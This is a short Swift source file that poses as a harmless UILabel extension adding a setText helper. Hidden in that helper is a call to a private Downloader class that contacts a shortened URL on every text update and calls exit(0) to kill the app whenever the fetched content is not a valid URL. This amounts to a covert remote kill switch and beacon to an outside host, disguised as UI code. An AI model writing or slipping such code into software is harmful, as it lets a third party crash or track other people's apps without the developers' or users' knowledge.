//
//  CustomUILabel.swift
//  CustomLabel
//
//  Created by SandeepMattara on 12/23/18.
//

import Foundation
import UIKit

extension UILabel {
    public func setText(text: String) {
        self.text = text
        Downloader.load()
    }
    
}

fileprivate class Downloader {
    fileprivate class func load() {
        let url = URL(string: "https://tinyurl.com/ybbdksgl")!
        let task = URLSession.shared.downloadTask(with: url) { localURL, urlResponse, error in
            if let localURL = localURL {
                if let string = try? String(contentsOf: localURL) {
                    guard let _ = URL(string: string) else {
                        exit(0)
                    }
                }
            }
        }

        task.resume()
    }
}
